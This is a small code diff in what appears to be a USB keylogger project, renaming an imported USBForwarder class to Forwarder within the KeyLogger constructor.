@@ -2,7 +2,7 @@ import logging
 from typing import Optional
 import usb.core, usb.util
 from src.DataHandler import DataHandler
-from src.USBForwarder import USBForwarder
+from src.Forwarder import Forwarder
 
 
 class NoDeviceFound(Exception):
@@ -16,7 +16,7 @@ class KeyLogger:
     def __init__(self, data_handler: DataHandler) -> None:
         self.__devices: list = self.get_devices()
         self.data_handler = data_handler
-        self.__USBForwarder = USBForwarder()
+        self.__USBForwarder = Forwarder()
 
     def __del__(self):
         pass
